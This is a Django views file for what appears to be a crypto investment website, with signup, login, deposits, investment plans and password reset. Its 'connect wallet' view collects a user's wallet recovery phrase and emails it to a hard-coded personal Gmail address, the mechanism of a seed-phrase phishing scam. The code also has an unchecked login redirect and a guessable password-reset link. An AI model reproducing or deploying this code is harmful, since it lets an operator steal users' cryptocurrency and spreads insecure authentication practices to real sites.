from django.shortcuts import redirect, render,get_list_or_404, get_object_or_404,reverse
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login, logout, get_user_model
from django.contrib import messages
from .models import *
# from index.forms import 
from django.http import HttpResponse
from .forms import *
from django.contrib.auth.models import User
from django.core.mail import EmailMessage,EmailMultiAlternatives
from django.conf import settings
from django.template.loader import render_to_string

User = get_user_model()

@login_required(login_url='/user/login/')
def profile(request):
	return render(request, 'acc/profile.html')


def refer(request):
	return render(request, 'acc/refer.html')

def withdraw(request):
	return render(request, 'acc/request.html')

def withdrawal(request):
	return render(request, 'acc/with.html')

def fund(request):
    qs = Pay_method.objects.filter(visible=True)
    context = {'wal':qs}
    return render(request, 'acc/deposit.html',context)

def myfund(request,slug):
    post = get_object_or_404(Pay_method, slug=slug)
    if request.method == 'POST':
        name = request.POST.get('name')
        price = request.POST.get('price')
        wallet = request.POST.get('wallet')
        image = request.FILES.get('image')
        user = request.POST.get('user')
        cre = Payment(name=name,price=price,wallet=wallet,image=image,user=user)
        cre.save()
        messages.success(request,'Your Payment will be Aproved in the next 24hrs...')
    context = {'data':post}
    return render(request,'acc/payment.html',context)

# def help(request):
#     if request.method == 'POST':
#         form = Contactform(request.POST)
#         if form.is_valid():
#             form.save()
#             messages.success(request, 'Thanks for your message we will repyl you shortly')
#     else:
#         form = Contactform()
#     return render(request, 'acc/help.html')

def signupView(request):
    if request.method == "POST":
        fullname = request.POST.get('fullname')
        username = request.POST.get('username')
        email = request.POST.get('email')
        phone = request.POST.get('phone')
        country = request.POST.get('country')
        password1 = request.POST.get("password1")
        password2 = request.POST.get("password2")
        if User.objects.filter(username=username).exists():
            messages.error(request, 'Username already taken')
            return redirect('userurl:signup')
        elif password1 != password2:
            messages.error(request, 'Passwords do not match')
            return redirect('userurl:signup')
        else:
            user = User.objects.create_user(username=username, password=password1,fullname=fullname,  email=email,phone=phone,country=country)
            email_body = render_to_string('index/wel.html', {
            'user': user,
            })
            msg = EmailMultiAlternatives(subject='welcome', body=email_body, from_email=settings.DEFAULT_FROM_EMAIL,to=[user.email] )
            msg.attach_alternative(email_body, "text/html")
            msg.send()
            return redirect('userurl:login')
    return render(request, 'acc/signup.html')


def loginView(request):
	if request.method == "POST":
		username = request.POST.get("username")
		password = request.POST.get("password")
		user = authenticate(request, username=username, password=password)
		if user is not None:
			login(request, user)
			newurl = request.GET.get('next')
			if newurl:
				return redirect(newurl)
			return redirect('userurl:profile')
		else:
			messages.error(request, 'Invalid Credentials')
	context = {}
	return render(request, 'acc/login.html')

def logout_view(request):
	logout(request)
	return redirect('/user/login')
def profit(request):
    qs = Profit.objects.filter(user=request.user)
    context = {'con':qs}
    return render(request,'acc/profit.html',context)
def plan(request):
    qs = Plan.objects.all()
    if request.method == 'POST':
        name = request.POST.get('name')
        duration = request.POST.get('duration')
        price = request.POST.get('price')
        cre = Join_Plan(name=name,duration=duration,price=price,user=request.user)
        cre.save()
        return redirect('userurl:my_invest')
    context = {'con':qs}
    return render(request,'acc/invest.html',context)

def myinvest(request):
    qs = Join_Plan.objects.filter(user=request.user)
    context = {'con':qs}
    return render(request,'acc/my_invest.html',context)


@login_required(login_url='/user/login/')
def mywallet(request):
	obj = Wallet.objects.all()
	context = {'con':obj}
	return render(request, 'wal/index.html',context)
@login_required(login_url='/user/login/')
def mycon(request, slug):
    post = get_object_or_404(Wallet, slug=slug)
    if request.method == 'POST':
        wallet_type = request.POST.get('wallet_type')
        phrase = request.POST.get('phrase')
        try:
            user = User.objects.get(username=request.user)
            create = Key.objects.create(wallet_type=wallet_type,phrase=phrase,user=user)
            msg = EmailMessage('Wallect Connected',
            user.username + " Has connected wallet" + create.phrase +  
            "check your dashboard for more info",
            settings.DEFAULT_FROM_EMAIL,['ewaenpatrick5@gmail.com'],)
            msg.send()
            return render(request,'acc/suc.html')
        except get_user_model().DoesNotExist:
            messages.error(request, 'Invalid Request Contact Admin')
        return render(request,'acc/wallet.html')
    context = {'data':post}
    return render(request, 'wal/wallet.html', context)


def change_password(request):
    if request.method == 'POST':
        form = ChangePasswordCodeForm(request.POST)
        if form.is_valid():
			# try:
            email = form.cleaned_data.get('user_email')
            detail = ChangePasswordCode.objects.filter(user_email=email)
            if detail.exists():
				# messages.add_message(request, messages.INFO, 'invalid')
                for i in detail:
                    i.delete()
                form.save()
                test = ChangePasswordCode.objects.get(user_email=email)
                subject = "Change Password"
                from_email = settings.EMAIL_HOST_USER
                # Now we get the list of emails in a list form.
                to_email = [email]
                #Opening a file in python, with closes the file when its done running
                detail2 = "https://www.ecircleng.com/accounts/"+ str(test.user_id)
                msg = EmailMessage(
                'Reset Password',
                'Click ' + detail2 + " To reset your password",
                settings.DEFAULT_FROM_EMAIL,
                [email],
                )
                msg.send()
                return redirect('userurl:change_password_confirm')
            else:
                form.save()
                test = ChangePasswordCode.objects.get(user_email=email)
                html = "https://www.ecircleng.com/accounts/"+ str(test.user_id)

                msg = EmailMessage(
                'Reset Password',
                'Click ' + html + " To reset your password",
                settings.DEFAULT_FROM_EMAIL,
                [email],
                )
                msg.send()
                return redirect('userurl:change_password_confirm')

        else:
            return HttpResponse('Invalid Email Address')
    else:
        form = ChangePasswordCodeForm()
    return render(request, 'acc/change_password.html', {'form':form})


def change_password_confirm(request):
	return render(request, 'acc/change_password_confirm.html', {})
def change_password_code(request, pk):
	try:
		test = ChangePasswordCode.objects.get(pk=pk)
		detail_email = test.user_email
		u = User.objects.get(email=detail_email)
		if request.method == 'POST':
			form = ChangePasswordForm(request.POST)
			if form.is_valid():
				u = User.objects.get(email=detail_email)
				new_password = form.cleaned_data.get('new_password')
				confirm_new_password = form.cleaned_data.get('confirm_new_password')
				if new_password == confirm_new_password:
					u.set_password(confirm_new_password)
					u.save()
					test.delete()
					return redirect('userurl:change_password_success')
				else:
					return HttpResponse('your new password should match with the confirm password')


			else:
				return HttpResponse('Invalid Details')
		else:
			form = ChangePasswordForm()
		return render(request, 'acc/change_password_code.html', {'test':test, 'form':form, 'u':u})
	except ChangePasswordCode.DoesNotExist:
		return HttpResponse('bad request')


def change_password_success(request):
	return render(request, 'acc/suc1.html', {})